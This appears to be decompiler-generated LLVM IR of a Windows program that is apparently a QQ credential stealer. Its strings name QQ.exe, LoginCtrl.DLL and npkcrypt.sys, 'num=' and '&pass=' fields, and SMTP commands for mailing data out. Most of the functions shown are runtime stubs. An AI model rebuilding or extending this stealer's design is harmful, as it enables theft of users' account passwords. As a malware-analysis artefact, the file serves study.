source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = local_unnamed_addr global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212308
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_404c5c = local_unnamed_addr constant i32 43
@global_var_404c74 = constant i32 37
@global_var_404cfc = local_unnamed_addr constant i32 63
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_404dc0 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_404dc4 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4080f8 = global i32 1
@global_var_404de0 = constant [10 x i8] c"First Run\00"
@global_var_404e9c = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_404eb8 = constant [10 x i8] c"First Run\00"
@global_var_408138 = external local_unnamed_addr global i32
@global_var_4080c0 = local_unnamed_addr global i32 0
@global_var_4080e8 = global i32 4213024
@global_var_4080f4 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212320
@global_var_4080c8 = local_unnamed_addr global i32 0
@global_var_4080e4 = global i32 4212956
@global_var_4080dc = local_unnamed_addr global i32 4212820
@global_var_4080f0 = global i32 4230401
@global_var_404f64 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_404f74 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_40813c = external local_unnamed_addr global i32
@global_var_405238 = constant [9 x i8] c"ComboBox\00"
@global_var_408140 = external local_unnamed_addr global i32
@global_var_40812c = external local_unnamed_addr global i32
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = global i32 4212752
@global_var_4096ac = local_unnamed_addr global i32 0
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_4080fc = local_unnamed_addr global i32 4215688
@B64EncodeTable_at_405388 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405a60 = constant [6 x i8] c"HELO \00"
@global_var_405a70 = constant [3 x i8] c"\0D\0A\00"
@global_var_405a7c = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405a94 = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_405aac = constant i32 62
@global_var_405ab8 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_405acc = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_405adc = constant [8 x i8] c"From: <\00"
@global_var_405aec = constant [6 x i8] c"To: <\00"
@global_var_405afc = constant [10 x i8] c"Subject: \00"
@global_var_405b10 = constant i32 46
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_405b1c = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_405b66 = local_unnamed_addr constant i32 763609949
@global_var_405c88 = constant [7 x i8] c"#32770\00"
@global_var_405c98 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_405ce4 = local_unnamed_addr constant i32 4218088
@global_var_405ce8 = local_unnamed_addr constant i32 841875985
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_408100 = local_unnamed_addr global i32 4218380
@global_var_408128 = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_408154 = external local_unnamed_addr global i32
@global_var_406008 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408104 = local_unnamed_addr global i32 0
@global_var_408148 = external local_unnamed_addr global i32
@global_var_408108 = local_unnamed_addr global i32 0
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_4080ec = global i32 4213092
@global_var_408124 = local_unnamed_addr global i32* @global_var_4080ec
@global_var_406320 = constant [6 x i8] c"Down(\00"
@global_var_406330 = constant i32 41
@global_var_40633c = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_406340 = constant [5 x i8] c"Open\00"
@global_var_4096d0 = global i32 0
@global_var_4065ac = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4212888
@global_var_4065b8 = constant i32 47
@global_var_4065f8 = local_unnamed_addr constant i32 64
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_408144 = local_unnamed_addr global i32* @global_var_4080e8
@global_var_406604 = constant [5 x i8] c"num=\00"
@global_var_406614 = constant [7 x i8] c"&pass=\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_4080d8
@global_var_4066d0 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_4066e0 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4067f2 = local_unnamed_addr constant [14 x i8] c", wo xiang ni\00"
@global_var_406800 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_408130 = local_unnamed_addr global i32* @global_var_409668
@global_var_406808 = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096d4 = local_unnamed_addr global i32 0
@global_var_4096dc = local_unnamed_addr global i32 0
@global_var_408150 = local_unnamed_addr global i32* @global_var_40966c
@global_var_406a7c = local_unnamed_addr constant [11 x i8] c"xiaran.obj\00"
@global_var_406a90 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_406a9c = local_unnamed_addr constant i32 47
@global_var_406888 = local_unnamed_addr constant i32 4221068
@global_var_40688c = local_unnamed_addr constant i32 841875985
@global_var_406bbc = local_unnamed_addr constant [10 x i8] c"IEINF.obj\00"
@global_var_406bd0 = constant i32 47
@global_var_406bdc = constant [3 x i8] c"\0D\0A\00"
@global_var_4096d8 = local_unnamed_addr global i32 0
@global_var_4071b4 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_407260 = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_4073e8 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080f0
@global_var_4073f4 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408120 = local_unnamed_addr global i32* @global_var_4096d0
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_4096ec = local_unnamed_addr global i32 0
@global_var_4096f0 = local_unnamed_addr global i32 0
@global_var_40810c = local_unnamed_addr global i32 0
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_4078d4 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_4078f8 = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_4079a4 = constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_407584 = local_unnamed_addr constant i32 4224464
@global_var_4075d0 = constant i32 1867011080
@global_var_40798c = constant [11 x i8] c"user32.dll\00"
@global_var_40810d = local_unnamed_addr global i32 0
@global_var_4096f4 = local_unnamed_addr global i32 0
@global_var_407a84 = local_unnamed_addr constant i32 30
@global_var_409804 = local_unnamed_addr global i32 0
@global_var_407e24 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_409800 = local_unnamed_addr global i32 0
@global_var_407e34 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407e4c = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_407e64 = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407e74 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407e84 = constant [8 x i8] c"LISTBOX\00"
@global_var_409808 = global i32 0
@global_var_407e94 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\10H@\00"
@global_var_4080d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_4096f8 = external global i8*
@global_var_408118 = local_unnamed_addr global %_SECURITY_ATTRIBUTES* null

declare i32 @unknown_4e40() local_unnamed_addr

declare i32 @unknown_4f18() local_unnamed_addr

define i32* @GetStdHandle.22(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.32(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.23(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.21(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.20(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.30(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.33(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.31(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.27(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.28() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.12(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.18(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.13(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.14(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.15(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.16(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.17(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.19(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.29(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"() local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

dec_label_pc_4036c2:                              ; preds = %dec_label_pc_4036bc
  store i32 %5, i32* %3, align 4, !insn.addr !85
  br label %dec_label_pc_4036c6, !insn.addr !85

dec_label_pc_4036c6:                              ; preds = %dec_label_pc_4036c2, %dec_label_pc_4036bc, %dec_label_pc_4036b8
  ret i32 %0, !insn.addr !86
}

define i32 @function_4036c8() local_unnamed_addr {
dec_label_pc_4036c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !87
  %spec.select = select i1 %1, i32 4208333, i32 %0
  ret i32 %spec.select, !insn.addr !88
}

declare i32 @InternalUniqueString() local_unnamed_addr

